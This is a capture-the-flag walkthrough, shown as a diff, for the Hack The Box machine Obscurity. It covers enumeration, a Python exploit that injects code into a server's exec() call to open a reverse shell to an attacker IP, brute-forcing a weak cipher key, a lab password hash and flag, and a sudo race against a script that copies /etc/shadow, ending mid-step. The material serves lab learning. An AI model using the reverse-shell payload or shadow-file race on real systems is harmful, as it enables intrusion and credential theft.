@@ -1,0 +1,444 @@
+I"��<p>Walkthrough for OBSCURITY - 10.10.10.168</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>first we assign the ip addresses to a local variables:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TARGET</span><span class="o">=</span>10.10.10.168
+<span class="nv">ATTACK</span><span class="o">=</span>10.10.14.34
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-Pn</span> <span class="nv">$TARGET</span>
+</code></pre></div></div>
+
+<p>I get</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   closed http
+8080/tcp open   http-proxy
+9000/tcp closed cslistener
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ik</span> <span class="nv">$TARGET</span> 
+curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 10.10.10.168 port 80: Connection refused
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-Ik</span> <span class="nv">$TARGET</span>:8080 
+HTTP/1.1 200 OK
+Date: Thu, 05 Dec 2019 21:03:30
+Server: BadHTTPServer
+Last-Modified: Thu, 05 Dec 2019 21:03:30
+Content-Length: 4171
+Content-Type: text/html
+Connection: Closed
+</code></pre></div></div>
+
+<p>I use the browser to view the source code:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"education-description"</span><span class="nt">&gt;</span>Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>gobuster time!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+</code></pre></div></div>
+
+<p>It gives me nonsense, use wfuzz instead:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-w</span> /usr/share/wfuzz/wordlist/general/common.txt <span class="nt">--hc</span> 404 http://<span class="nv">$TARGET</span>:8080/FUZZ
+</code></pre></div></div>
+
+<p>moar directories!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-w</span> /usr/share/wfuzz/wordlist/general/common.txt <span class="nt">--hc</span> 404 http://<span class="nv">$TARGET</span>:8080/FUZZ
+</code></pre></div></div>
+
+<p>with ignore errors:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -Z -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hc 404 http://$TARGET:8080/FUZZ/SuperSecureServer.py
+</code></pre></div></div>
+
+<p>I find the script in develop</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 10.10.10.168:8080/develop/SuperSecureServer.py &gt; SuperSecureServer.py
+</code></pre></div></div>
+
+<p>it is py3</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 SuperSecureServer.py
+</code></pre></div></div>
+
+<p>I read the script, need to establish the server is on port 8080:
+<code class="highlighter-rouge">http://10.10.10.168:8080/errors/400.html</code></p>
+
+<p>this works:
+curl -i “http://127.0.0.1:8080/../develop/SuperSecureServer.py</p>
+
+<p>as does:</p>
+
+<p>curl -i “http://$TARGET:8080/../develop/SuperSecureServer.py”</p>
+
+<p>Ok, so I look at the code:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">info</span> <span class="o">=</span> <span class="s">"output = 'Document: {}'"</span> <span class="c1"># Keep the output for later debug
+</span><span class="k">exec</span><span class="p">(</span><span class="n">info</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
+</span></code></pre></div></div>
+
+<p>After some research I find out htis is not the way to do formatting.</p>
+
+<p>basically the url</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># script sends a reverse shell back to port 9000 on 10.10.14.38
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="c1">#import socket # in SuperSecureServer.py
+#import threading # in SuperSecureServer.py
+#from datetime import datetime # in SuperSecureServer.py
+#import sys # in SuperSecureServer.py
+#import os # in SuperSecureServer.py
+#import mimetypes # in SuperSecureServer.py
+#import urllib.parse # in SuperSecureServer.py
+#import subprocess # in SuperSecureServer.py
+</span>
+<span class="n">path</span><span class="o">=</span><span class="s">"errors/404.html"</span> <span class="c1">#known good url
+</span>
+<span class="c1">#exec(\"import socket, subprocess;s = socket.socket();s.connect((?127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")
+</span>
+<span class="n">path</span><span class="o">+=</span><span class="s">"'</span><span class="se">\n</span><span class="s">import socket, subprocess;s = socket.socket();s.connect((</span><span class="se">\'</span><span class="s">10.10.14.38</span><span class="se">\'</span><span class="s">,9000))</span><span class="se">\n</span><span class="s">while 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())</span><span class="se">\n\'</span><span class="s">"</span>
+
+<span class="c1">#info = "output = 'Document: {}'" # Keep the output for later debug
+#exec(info.format(path)) # This is how you do string formatting, right?
+</span>
+<span class="c1">#print('!Local Test!')
+#exec("output = 'Document: {}'".format(path))
+#print('!Local Test!')
+</span>
+<span class="k">print</span> <span class="p">(</span><span class="n">path</span><span class="p">)</span>
+
+<span class="c1">#url = 'http://127.0.0.1:8080/'+path #for local server testing
+</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://10.10.10.168:8080/'</span><span class="o">+</span><span class="n">path</span>
+
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="c1">#print (r.status_code) #for debug
+#print (r.text) #for debug
+</span>
+</code></pre></div></div>
+
+<p>I run  listener with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 9000
+</code></pre></div></div>
+
+<p>then the script above:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py
+</code></pre></div></div>
+
+<p>I catch a shell!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on [any] 9000 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.10.168] 58856
+</code></pre></div></div>
+
+<blockquote>
+  <p>/usr/bin/python3 -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
+</blockquote>
+
+<p>I poke around to find /home/robert/SuperSecureCrypt.py:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">encrypted</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
+        <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
+        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
+    <span class="k">return</span> <span class="n">encrypted</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
+        <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
+        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
+    <span class="k">return</span> <span class="n">decrypted</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Encrypt with 0bscura</span><span class="se">\'</span><span class="s">s encryption algorithm'</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-i'</span><span class="p">,</span>
+                    <span class="n">metavar</span><span class="o">=</span><span class="s">'InFile'</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="s">'The file to read'</span><span class="p">,</span>
+                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-o'</span><span class="p">,</span>
+                    <span class="n">metavar</span><span class="o">=</span><span class="s">'OutFile'</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="s">'Where to output the encrypted/decrypted file'</span><span class="p">,</span>
+                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-k'</span><span class="p">,</span>
+                    <span class="n">metavar</span><span class="o">=</span><span class="s">'Key'</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="s">'Key to use'</span><span class="p">,</span>
+                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">'store_true'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Decrypt mode'</span><span class="p">)</span>
+
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="n">banner</span> <span class="o">=</span> <span class="s">"################################</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span><span class="o">+=</span> <span class="s">"#           BEGINNING          #</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span><span class="o">+=</span> <span class="s">"#    SUPER SECURE ENCRYPTOR    #</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span><span class="o">+=</span> <span class="s">"################################</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  ############################</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  #        FILE MODE         #</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  ############################"</span>
+<span class="k">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">o</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">k</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">i</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Missing args"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">d</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Opening file {0}..."</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Decrypting..."</span><span class="p">)</span>
+        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">k</span><span class="p">)</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Writing to {0}..."</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Opening file {0}..."</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Encrypting..."</span><span class="p">)</span>
+        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">k</span><span class="p">)</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Writing to {0}..."</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
+
+<span class="c1">#out.txt
+</span><span class="s">"""¦ÚÈêÚÞØÛÝÝ×ÐÊß
+ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ
+êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v"""</span>
+</code></pre></div></div>
+
+<p>/home/robert/BetterSSH/BetterSSH.py</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">random</span><span class="p">,</span> <span class="n">string</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">crypt</span>
+<span class="kn">import</span> <span class="nn">traceback</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">path</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s">"user"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span> <span class="s">"authenticated"</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Enter username: "</span><span class="p">)</span>
+    <span class="n">passW</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Enter password: "</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/etc/shadow'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">[(</span><span class="n">p</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span> <span class="k">if</span> <span class="s">"$"</span> <span class="ow">in</span> <span class="n">p</span> <span class="k">else</span> <span class="bp">None</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
+    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">passwords</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+    <span class="n">passwordFile</span> <span class="o">=</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">])</span> 
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">passwordFile</span><span class="p">)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">.1</span><span class="p">)</span>
+    <span class="n">salt</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">realPass</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]:</span>
+            <span class="n">salt</span><span class="p">,</span> <span class="n">realPass</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'$'</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+            <span class="k">break</span>
+
+    <span class="k">if</span> <span class="n">salt</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid user"</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">salt</span> <span class="o">=</span> <span class="s">'$6$'</span><span class="o">+</span><span class="n">salt</span><span class="o">+</span><span class="s">'$'</span>
+    <span class="n">realPass</span> <span class="o">=</span> <span class="n">salt</span> <span class="o">+</span> <span class="n">realPass</span>
+
+    <span class="nb">hash</span> <span class="o">=</span> <span class="n">crypt</span><span class="o">.</span><span class="n">crypt</span><span class="p">(</span><span class="n">passW</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nb">hash</span> <span class="o">==</span> <span class="n">realPass</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Authed!"</span><span class="p">)</span>
+        <span class="n">session</span><span class="p">[</span><span class="s">'authenticated'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Incorrect pass"</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="p">,</span><span class="n">path</span><span class="p">))</span>
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">()</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s">'authenticated'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]</span> <span class="o">+</span> <span class="s">"@Obscure$ "</span><span class="p">)</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s">'sudo'</span><span class="p">,</span> <span class="s">'-u'</span><span class="p">,</span>  <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]]</span>
+        <span class="n">cmd</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">))</span>
+        <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+
+        <span class="n">o</span><span class="p">,</span><span class="n">e</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Output: '</span> <span class="o">+</span> <span class="n">o</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Error: '</span>  <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>/home/robert/out.txt</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>¦ÚÈêÚÞØÛÝÝ×ÐÊß
+ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ
+êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
+</code></pre></div></div>
+
+<p>/home/robert/passwordreminder.txt</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>´ÑÈÌÉàÙÁÑé¯·¿k
+</code></pre></div></div>
+
+<p>cat /home/robert/check.txt</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Encrypting this file with your key should result in out.txt, make sure your key is correct! 
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 SuperSecureCrypt.py -i &lt;input file&gt; -o &lt;output file&gt; -k &lt;key&gt; -d
+</code></pre></div></div>
+
+<p>I brute force with rework.py to get a partial key</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alexandrov·\\bv¾dq]¿fbfsºqjTyÉfmd­]{Qu
+</code></pre></div></div>
+
+<p>this fails</p>
+
+<p>I double check with rockyou.txt to find:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alexandrovich
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 SuperSecureCrypt.py <span class="nt">-k</span> <span class="s2">"alexandrovich"</span> <span class="nt">-i</span> reminder.txt <span class="nt">-o</span> oooo.txt <span class="nt">-d</span>
+</code></pre></div></div>
+
+<p>to get:</p>
+
+<p>$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SecThruObsFTW
+</code></pre></div></div>
+
+<p>ls -la /tmp/SSH/</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>user.txt
+e4493782066b55fe2755708736ada2d7
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+</code></pre></div></div>
+
+<p>ls -la BetterSSH/BetterSSH.py</p>
+
+<p>I run it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 /home/robert/BetterSSH/BetterSSH.py
+</code></pre></div></div>
+
+<p>it gets a restricted shell, but whe I view the code</p>
+
+<p>cat BetterSSH/BetterSSH.py</p>
+
+<p>I see it takes all the usernames and passwords and writes to file before it checks the auth!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo python3 /home/robert/BetterSSH/BetterSSH.py
+Enter username: root
+Enter password: #I enter toor and do a Ctrl ^C as soon as I hit return
+</code></pre></div></div>
+
